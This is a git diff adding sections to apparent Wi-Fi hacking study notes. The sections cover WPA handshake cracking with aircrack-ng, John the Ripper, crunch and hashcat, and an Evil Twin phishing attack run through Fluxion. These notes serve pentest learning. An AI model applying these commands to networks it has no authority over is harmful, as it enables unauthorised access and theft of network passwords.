@@ -241,6 +241,55 @@ aircrack-ng (.cap file) -w (worldlist .txt)
 ```
 Hay empresas online donde puedes subir el handshake y ellos te lo analizan
 
+Saving Cracking Progress
+```
+john --wordlist=(name) -stdout --session=(name) | aircrack-ng -w - -b (BSSID) (handshake).cap
+john --restore=(name) | aircrack-ng -w - -b (BSSID) (handshake).cap
+```
+
+Using Huge Wordlists Without Wasting Storage
+```
+crunch 8 8 | aircrack-ng -w - -b (BSSID) (handshake).cap
+```
+
+Saving Cracking Progress and Using Huge Wordlists Without Wasting Storage
+```
+crunch 8 8 | john --stdin -stdout --session=(name) | aircrack-ng -w - -b (BSSID) (handshake).cap
+crunch 8 8 | john --restore=(name) | aircrack-ng -w - -b (BSSID) (handshake).cap
+```
+
+HashCat  
+- https://hashcat.net/hashcat/
+Convert the .cap to hashcat format .hccapx
+- https://hashcat.net/cap2hashcat/
+from windows cmd
+```
+hashcat64.exe --help
+hashcat64.exe -I
+hashcat64.exe -m 2500 -d (GPU number) (file).hccapx wordlist.txt
+```
+## Evil Twin Attack
+dea:
+1. Start a fake AP with same name as target network.
+2. Disconnect a client.
+3. Wait for them to connect to the fake AP.
+4. Automatically display a page asking for network key.
+
+Using Fluxion  
+- https://github.com/FluxionNetwork/fluxion
+Fluxion allow us to run Evil Twin attacks automatically, it will automatically do 
+all of the following:
+1. Start a fake AP with the same name as the target network.
+2. Start a web server with a fake login page.
+3. Disconnect all clients from this network.
+4. Display this login page once a client connects to the fake AP
+5. Check the entered password and make sure its the correct one
+```
+git clone https://www.github.com/FluxionNetwork/fluxion.git
+cd fluxion 
+./fluxion.sh
+```
+
 ## Bypassing Mac Filtering (Blacklists & Whitelists)
 - Whitelists
 ```
